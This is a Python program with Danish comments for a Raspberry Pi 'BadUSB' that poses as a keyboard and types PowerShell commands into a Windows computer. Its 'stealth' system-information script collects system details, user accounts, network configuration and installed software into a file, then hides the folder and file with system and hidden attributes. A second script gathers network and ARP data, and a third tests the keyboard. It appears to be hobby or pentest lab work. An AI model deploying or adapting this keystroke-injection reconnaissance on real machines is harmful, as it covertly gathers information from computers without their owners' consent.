#!/usr/bin/env python3
"""
BADUSB MAIN - 2 Script Eksempel
Kører automatisk af badusb.service
"""

import json
import time
import sys
from danish_hid_library import DanishHIDKeyboard

CONFIG_FILE = "/home/pi/badusb_config.json"
LOG_FILE = "/home/pi/badusb.log"

def log_message(message):
    """Logger beskeder til fil"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{timestamp}] MAIN: {message}\n")

def load_script():
    """Loader hvilket script der skal køres"""
    try:
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            script = config.get('current_script', 'none')
            log_message(f"Script valgt: {script}")
            return script
    except Exception as e:
        log_message(f"Fejl ved indlæsning af script: {e}")
        return 'none'

# ========================
# SCRIPT 1: SYSTEM INFORMATION
# ========================

def script_system_info(kb):
    """Henter system information STEALTH - alt i én fil i C:\BadUSB_Results"""
    log_message("Starter stealth system_info script")

    # Åbn PowerShell usynligt
    kb.win_r()
    time.sleep(0.5)
    kb.type_string("powershell") # -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass")
    kb.enter()
    time.sleep(2)

    # Opret mappen C:\BadUSB_Results (med Force for at undgå fejl)
    kb.type_string('$path = "C:\\BadUSB_Results"; if (!(Test-Path $path)) { New-Item -Path $path -ItemType Directory -Force }')
    kb.enter()
    time.sleep(1)

    # ALT data kommer i ÉN fil
    kb.type_string('echo "=== SYSTEM SCAN $(Get-Date) ===" > "$path\\system_data.txt"')
    kb.enter()
    time.sleep(0.5)

    # System info
    kb.type_string('systeminfo >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(3)

    kb.type_string('echo "--- HARDWARE ---" >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(0.3)
    kb.type_string('Get-WmiObject Win32_ComputerSystem >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(1)

    kb.type_string('echo "--- PROCESSOR ---" >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(0.3)
    kb.type_string('Get-WmiObject Win32_Processor >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(1)

    kb.type_string('echo "--- DISKS ---" >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(0.3)
    kb.type_string('Get-WmiObject Win32_LogicalDisk >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(1)

    kb.type_string('echo "--- NETWORK ---" >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(0.3)
    kb.type_string('ipconfig /all >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(1)

    kb.type_string('echo "--- USERS ---" >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(0.3)
    kb.type_string('net user >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(1)

    kb.type_string('echo "--- SOFTWARE ---" >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(0.3)
    kb.type_string('Get-WmiObject Win32_Product | Select Name,Version >> "$path\\system_data.txt"')
    kb.enter()
    time.sleep(2)

    # Gør mappen og filen skjulte
    kb.type_string('attrib +h +s "$path"')
    kb.enter()
    time.sleep(0.5)
    kb.type_string('attrib +h +s "$path\\system_data.txt"')
    kb.enter()
    time.sleep(0.5)

    # Luk PowerShell
    kb.type_string("exit")
    kb.enter()
    time.sleep(0.5)

# ========================
# SCRIPT 2: NETVÆRKS DIAGNOSTICERING
# ========================
def script_network_diag(kb):
    """Udfører komplet netværks diagnosticering"""
    log_message("Starter network_diag script")
    print("Kører netværks diagnosticering script...")

    kb.open_powershell(2)

    # Opret resultatmappe
    kb.run_command('$path = "C:\\BadUSB_Results"; if (!(Test-Path $path)) { New-Item -Path $path -ItemType Directory }', 1)

    # Netværks konfiguration
    kb.run_command('echo "=== NETVÆRKS KONFIGURATION ===" > "$path\\network_info.txt"', 1)
    kb.run_command('ipconfig /all >> "$path\\network_info.txt"', 2)

    # Netværks forbindelser
    kb.run_command('echo "=== AKTIVE FORBINDELSER ===" >> "$path\\network_info.txt"', 1)
    kb.run_command('netstat -an | Select-String "ESTABLISHED" >> "$path\\network_info.txt"', 2)

    # ARP tabel (lokale enheder)
    kb.run_command('echo "=== LOKALE ENHEDER (ARP) ===" >> "$path\\network_info.txt"', 1)
    kb.run_command('arp -a >> "$path\\network_info.txt"', 2)

    # Ping test til eksterne hosts
    kb.run_command('echo "=== PING TESTS ===" >> "$path\\network_info.txt"', 1)
    kb.run_command('echo "Google DNS:" >> "$path\\network_info.txt"', 1)
    kb.run_command('ping 8.8.8.8 -n 2 >> "$path\\network_info.txt"', 2)
    kb.run_command('echo "Cloudflare:" >> "$path\\network_info.txt"', 1)
    kb.run_command('ping 1.1.1.1 -n 2 >> "$path\\network_info.txt"', 2)

    # DNS resolution test
    kb.run_command('echo "=== DNS TESTS ===" >> "$path\\network_info.txt"', 1)
    kb.run_command('nslookup google.com >> "$path\\network_info.txt"', 2)

    # Vis resultat
    kb.run_command('echo " Netværks info gemt i C:\BadUSB_Results\\network_info.txt"', 1)
    kb.run_command('Get-Content "$path\\network_info.txt" | Select-Object -First 25', 2)

    kb.run_command("exit", 1)




def script_test_keyboard(kb):  # ← NY TEST FUNKTION
    """Tester keyboard - kører kun når service starter"""
    log_message("Starter keyboard test script")
    print("Testing keyboard...")

    kb.win_r()
    time.sleep(0.5)
    kb.type_string("notepad")
    kb.enter()
    time.sleep(2)
    kb.type_string("BadUSB Keyboard Test")
    kb.enter()
    kb.type_string("Pipe: |  Backslash: \\  Tilde: ~")
    kb.space()
    time.sleep(1)
    kb.enter()
    kb.type_string("Mindre: <  Større: >  Tuborg: {}")
    kb.enter()
    kb.type_string("Alt virker perfekt!")

def main():
    log_message("BadUSB service started")
    # Vent på USB
    time.sleep(5)

    # Find ud af hvad der skal køres
    script_valg = load_script()

    if script_valg == 'none':
        print("⏸️  Intet script valgt")
        return

    kb = DanishHIDKeyboard()

    # Kør det valgte script
    if script_valg == 'system_info':
        script_system_info(kb)
    elif script_valg == 'network_diag':
        script_network_diag(kb)
    elif script_valg == 'test_keyboard':
        script_test_keyboard(kb)
    else:
        print(f"❌ Ukendt script: {script_valg}")
    log_message("BadUSB service afsluttet")

if __name__ == "__main__":
    main()